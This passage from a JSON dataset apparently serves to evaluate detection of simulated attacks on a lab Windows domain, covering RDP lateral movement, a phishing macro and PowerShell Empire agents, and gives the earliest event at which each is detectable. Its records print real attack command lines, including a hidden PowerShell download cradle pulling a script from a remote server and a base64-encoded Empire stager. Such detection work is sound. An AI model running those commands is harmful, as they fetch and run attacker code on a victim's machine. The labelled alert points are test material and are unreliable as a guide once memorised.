+    "step": 2,
+    "name": "Agent starts, contacts its server and exchanges keys",
+    "n_events": 34,
+    "ts": "2000-08-07T13:34:20.241-04:00"
+   },
+   {
+    "step": 3,
+    "name": "Side effects of the new PowerShell",
+    "n_events": 11,
+    "ts": "2000-08-07T13:34:26.179-04:00"
+   },
+   {
+    "step": 4,
+    "name": "Agent checks in with its server every few seconds",
+    "n_events": 2175,
+    "ts": "2000-08-07T13:34:30.092-04:00"
+   },
+   {
+    "step": 5,
+    "name": "Attacker collects system information",
+    "n_events": 38,
+    "ts": "2000-08-07T13:37:19.898-04:00"
+   },
+   {
+    "step": 6,
+    "name": "Attacker runs a password-stealing tool in memory",
+    "n_events": 1447,
+    "ts": "2000-08-07T13:40:36.905-04:00"
+   },
+   {
+    "step": 7,
+    "name": "Attacker lists running processes",
+    "n_events": 369,
+    "ts": "2000-08-07T13:43:04.17-04:00"
+   },
+   {
+    "step": 8,
+    "name": "Attacker loads an in-memory injection module",
+    "n_events": 403,
+    "ts": "2000-08-07T13:43:40.265-04:00"
+   },
+   {
+    "step": 9,
+    "name": "Attacker lists running processes again",
+    "n_events": 369,
+    "ts": "2000-08-07T13:48:42.514-04:00"
+   },
+   {
+    "step": 10,
+    "name": "Attacker tries to inject into another process",
+    "n_events": 41,
+    "ts": "2000-08-07T13:49:57.801-04:00"
+   },
+   {
+    "step": 11,
+    "name": "Attacker drops a batch file and loads a run-as helper",
+    "n_events": 13,
+    "ts": "2000-08-07T13:51:52.657-04:00"
+   },
+   {
+    "step": 12,
+    "name": "Attacker maps the domain with a reconnaissance tool",
+    "n_events": 150,
+    "ts": "2000-08-07T13:53:52.603-04:00"
+   },
+   {
+    "step": 13,
+    "name": "Attacker lists the domain controllers with net.exe",
+    "n_events": 57,
+    "ts": "2000-08-07T13:55:38.273-04:00"
+   },
+   {
+    "step": 14,
+    "name": "Attacker re-checks the machine",
+    "n_events": 8,
+    "ts": "2000-08-07T13:59:00.763-04:00"
+   },
+   {
+    "step": 15,
+    "name": "Attacker lists the Windows system folder",
+    "n_events": 1887,
+    "ts": "2000-08-07T13:59:32.139-04:00"
+   },
+   {
+    "step": 16,
+    "name": "Attacker looks for a file",
+    "n_events": 8,
+    "ts": "2000-08-07T14:00:02.771-04:00"
+   },
+   {
+    "step": 17,
+    "name": "Attacker downloads a system file",
+    "n_events": 13,
+    "ts": "2000-08-07T14:01:46.479-04:00"
+   },
+   {
+    "step": 18,
+    "name": "Attacker spreads to the domain controller",
+    "n_events": 14,
+    "ts": "2000-08-07T14:03:22.194-04:00"
+   },
+   {
+    "step": 19,
+    "name": "Agent shuts down",
+    "n_events": 11,
+    "ts": "2000-08-07T14:05:16.504-04:00"
+   }
+  ],
+  "n_malicious": 7054,
+  "n_context": 9
+ },
+ {
+  "source": "eval w01",
+  "machine": "host-83fa",
+  "split": "eval",
+  "attack_id": "atk-1c3642",
+  "name": "RDP hop: admin Remote Desktop session from another workstation, document browsing, RDP onward to the next machine",
+  "alert_from": "2000-09-07T13:54:36.426-04:00",
+  "why_alert_from": "Up to this event the expert has seen, in order: an inbound RDP connection from another internal machine, a new desktop session, a remote logon by the sysadmin, a domain account with administrator rights, from that machine, the routine first-logon setup of a new profile (including the lab's standard logon scripts, which run identically for every user on this network), and that administrator opening three documents and starting the Remote Desktop client. Each of those has an ordinary explanation: IT staff do log on remotely, open files and start RDP. At this event the RDP client connects out to a third machine (10.47.35.74, port 3389): the account that arrived by RDP from one workstation now hops on to another. That workstation-to-workstation RDP chain is lateral movement with no normal office purpose, so this is the first event at which an expert can conclude it is an attack. One event earlier the RDP client was only preparing its cache folders in the profile (13:54:35.862); it had started 20 seconds before with no destination on its command line, so the destination, and therefore the chain, was not yet visible.",
+  "alert_point": {
+   "id": "d10fbe21-6582-1747-6386-4a00805f634a",
+   "ts": "2000-09-07T13:54:36.426-04:00",
+   "kind": "FLOW START",
+   "actor_image": "mstsc.exe",
+   "principal": "SYSTEMIACOM\\sysadmin",
+   "dest": "10.47.35.74:3389",
+   "direction": "outbound",
+   "src": "10.225.5.247:61205"
+  },
+  "ancestry": [
+   {
+    "image": "mstsc.exe",
+    "command_line": "\"C:\\Windows\\system32\\mstsc.exe\" ",
+    "user": "SYSTEMIACOM\\sysadmin",
+    "ts": "2000-09-07T13:54:16.378-04:00"
+   },
+   {
+    "image": "explorer.exe",
+    "command_line": "C:\\Windows\\Explorer.EXE",
+    "user": "SYSTEMIACOM\\sysadmin",
+    "ts": "2000-09-07T13:48:25.071-04:00"
+   },
+   {
+    "image": "userinit.exe",
+    "command_line": "C:\\Windows\\system32\\userinit.exe",
+    "user": "SYSTEMIACOM\\sysadmin",
+    "ts": "2000-09-07T13:48:24.844-04:00"
+   },
+   {
+    "image": "winlogon.exe",
+    "command_line": "winlogon.exe",
+    "user": "NT AUTHORITY\\SYSTEM",
+    "ts": "2000-09-07T13:47:20.019-04:00"
+   }
+  ],
+  "lead_up": [
+   {
+    "name": "This machine answers a name lookup, then another workstation opens a Remote Desktop connection to it",
+    "n_events": 9,
+    "ts": "2000-09-07T13:46:46.12-04:00"
+   },
+   {
+    "name": "Windows builds a new desktop session and logs the attacker in as sysadmin",
+    "n_events": 113,
+    "ts": "2000-09-07T13:47:19.949-04:00"
+   },
+   {
+    "name": "Windows creates and loads a user profile for the attacker's account",
+    "n_events": 2791,
+    "ts": "2000-09-07T13:47:28.222-04:00"
+   },
+   {
+    "name": "The attacker's desktop starts and runs its first-logon setup",
+    "n_events": 7054,
+    "ts": "2000-09-07T13:48:15.052-04:00"
+   },
+   {
+    "name": "The testbed's standard logon scripts run under the attacker's account",
+    "n_events": 263,
+    "ts": "2000-09-07T13:48:17.947-04:00"
+   },
+   {
+    "name": "The attacker opens the user's documents in Excel and Word",
+    "n_events": 367,
+    "ts": "2000-09-07T13:51:54.179-04:00"
+   },
+   {
+    "name": "The attacker starts the Remote Desktop client",
+    "n_events": 11,
+    "ts": "2000-09-07T13:54:16.378-04:00"
+   }
+  ],
+  "steps": [
+   {
+    "step": 1,
+    "name": "The attacker hops on to the next workstation over Remote Desktop",
+    "n_events": 19,
+    "ts": "2000-09-07T13:54:36.426-04:00"
+   },
+   {
+    "step": 2,
+    "name": "The attacker's session keeps running in the background",
+    "n_events": 260,
+    "ts": "2000-09-07T13:54:39.001-04:00"
+   }
+  ],
+  "n_malicious": 279,
+  "n_context": 10608
+ },
+ {
+  "source": "eval w02",
+  "machine": "host-8180",
+  "split": "eval",
+  "attack_id": "atk-229bd8",
+  "name": "Phishing Word document: macro runs a hidden PowerShell download cradle, Empire agent beacons to its C2 server",
+  "alert_from": "2000-06-20T10:39:40.578-04:00",
+  "why_alert_from": "Up to this point the attack's events show only a user opening an email attachment in Word and Word loading its macro engine, which is what many genuine documents do. At this event Word starts cmd.exe running a hidden, profile-less PowerShell that downloads code from an internet server and runs it: a classic macro download cradle with no benign explanation. One event earlier (Word's last ordinary start-up step) there was nothing malicious to see.",
+  "alert_point": {
+   "id": "01638192-afed-ed30-e35c-9ce4730429d3",
+   "ts": "2000-06-20T10:39:40.578-04:00",
+   "kind": "PROCESS CREATE",
+   "actor_image": "cmd.exe",
+   "principal": "SYSTEMIACOM\\rsantilli",
+   "image": "cmd.exe",
+   "parent": "winword.exe",
+   "user": "SYSTEMIACOM\\rsantilli",
+   "command_line": "C:\\Windows\\System32\\cmd.exe /k powershell.exe -NoP -sta -NonI -W Hidden $e=(New-Object System.Net.WebClient).DownloadString('http://news.com:8000/default.ps1');powershell -noP -sta -w 1 -enc $e "
+  },
+  "ancestry": [
+   {
+    "image": "winword.exe",
+    "command_line": "\"C:\\Program Files (x86)\\Microsoft Office\\Office15\\WINWORD.EXE\" /n \"C:\\Users\\rsantilli\\AppData\\Local\\Microsoft\\Windows\\INetCache\\Content.Outlook\\498U06BX\\payroll.docx\" /o \"\"",
+    "user": "SYSTEMIACOM\\rsantilli",
+    "ts": "2000-06-20T10:39:23.033-04:00"
+   },
+   {
+    "image": "outlook.exe",
+    "command_line": "\"C:\\Program Files (x86)\\Microsoft Office\\Office15\\OUTLOOK.EXE\" ",
+    "user": "SYSTEMIACOM\\rsantilli",
+    "ts": "2000-06-20T10:22:23.011-04:00"
+   },
+   {
+    "image": "explorer.exe",
+    "command_line": "C:\\Windows\\Explorer.EXE",
+    "user": "SYSTEMIACOM\\rsantilli",
+    "ts": "2000-06-20T10:16:45.501-04:00"
+   }
+  ],
+  "lead_up": [
+   {
+    "name": "The user opens the emailed attachment payroll.docx",
+    "n_events": 23,
+    "ts": "2000-06-20T10:39:19.195-04:00"
+   },
+   {
+    "name": "Word opens the document and loads its macro engine",
+    "n_events": 119,
+    "ts": "2000-06-20T10:39:23.12-04:00"
+   }
+  ],
+  "steps": [
+   {
+    "step": 1,
+    "name": "The macro starts a hidden PowerShell download cradle",
+    "n_events": 66,
+    "ts": "2000-06-20T10:39:40.578-04:00"
+   },
+   {
+    "step": 2,
+    "name": "The stager downloads the agent from the attacker's server and starts it",
+    "n_events": 22,
+    "ts": "2000-06-20T10:39:40.948-04:00"
+   },
+   {
+    "step": 3,
+    "name": "The Empire agent starts, turns off script scanning and sets up an encrypted channel",
+    "n_events": 36,
+    "ts": "2000-06-20T10:39:48.085-04:00"
+   },
+   {
+    "step": 4,
+    "name": "Windows housekeeping for the attacker's PowerShell, shell and console",
+    "n_events": 17,
+    "ts": "2000-06-20T10:39:56.736-04:00"
+   },
+   {
+    "step": 5,
+    "name": "The agent beacons to its server every five seconds",
+    "n_events": 88,
+    "ts": "2000-06-20T10:40:01.675-04:00"
+   }
+  ],
+  "n_malicious": 229,
+  "n_context": 142
+ },
+ {
+  "source": "eval w03",
+  "machine": "host-d2af",
+  "split": "eval",
+  "attack_id": "atk-82bc9c",
+  "name": "Remote WMI launch of a hidden PowerShell Empire agent that beacons to its server",
+  "alert_from": "2000-03-14T14:44:54.877-04:00",
+  "why_alert_from": "This is the first attack event in the stream: nothing from the attacker's address or account appears before it (the warm-up holds no attack events, and the name lookups and logon records of the remote connection are written just after it). In it the WMI service starts a hidden, profile-less PowerShell with a base64-encoded command as zleazer, a pattern that is a well-known sign of remote attack tooling. Since there is no earlier attack event, nothing before it could have been enough.",
+  "alert_point": {
+   "id": "2ad69d8d-a4ae-8b08-54ef-9d5b1c806139",
+   "ts": "2000-03-14T14:44:54.877-04:00",
+   "kind": "PROCESS CREATE",
+   "actor_image": "powershell.exe",
+   "principal": "SYSTEMIACOM\\zleazer",
+   "image": "powershell.exe",
+   "parent": "wmiprvse.exe",
+   "user": "SYSTEMIACOM\\zleazer",
+   "command_line": "C:\\Windows\\System32\\WindowsPowershell\\v1.0\\powershell -noP -sta -w 1 -enc  SQBGACgAJABQAFMAVgBlAHIAcwBJAE8ATgBUAEEAQgBMAEUALgBQAFMAVgBlAFIAcwBJAE8ATgAuAE0AYQBKAG8AcgAgAC0ARwBlACAAMwApAHsAJABHAFAARgA9AFsAUgBFAEYAXQAuAEEAUwBzAGUAbQBCAGwAeQAuAEcAZQBUAFQAeQBQAEUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBVAHQAaQBsAHMAJwApAC4AIgBHAEUAdABGAEkARQBgAEwARAAiACgAJwBjAGEAYwBoAGUAZABHAHIAbwB1AHAAUABvAGwAaQBjAHkAUwBlAHQAdABpAG4AZwBzACcALAAnAE4AJwArACcAbwBuAFAAdQBiAGwAaQBjACwAUwB0A"
+  },
+  "ancestry": [],
+  "lead_up": [],
+  "steps": [
+   {
+    "step": 1,
+    "name": "WMI starts a hidden, encoded PowerShell",
+    "n_events": 6,
+    "ts": "2000-03-14T14:44:54.877-04:00"
+   },
+   {
+    "step": 2,
+    "name": "Windows records the attacker's name lookups and network logons",
+    "n_events": 23,
+    "ts": "2000-03-14T14:44:55.037-04:00"
+   },
+   {
+    "step": 3,
+    "name": "The agent starts up and turns off script scanning",
+    "n_events": 13,
+    "ts": "2000-03-14T14:44:58.101-04:00"
+   },
+   {
+    "step": 4,
+    "name": "The agent contacts its server, sets up encryption and describes the machine",
+    "n_events": 21,
+    "ts": "2000-03-14T14:45:01.486-04:00"
+   },
+   {
+    "step": 5,
+    "name": "Windows housekeeping for the attacker's PowerShell and console host",
+    "n_events": 12,
+    "ts": "2000-03-14T14:45:04.2-04:00"
+   },
+   {
+    "step": 6,
+    "name": "The agent beacons to its server every five seconds",
+    "n_events": 87,
+    "ts": "2000-03-14T14:45:08.729-04:00"
+   },
+   {
+    "step": 7,
+    "name": "The attacker's remote logons close",
+    "n_events": 3,
+    "ts": "2000-03-14T14:45:22.495-04:00"
+   }
+  ],
+  "n_malicious": 165,
+  "n_context": 0
+ }
+]
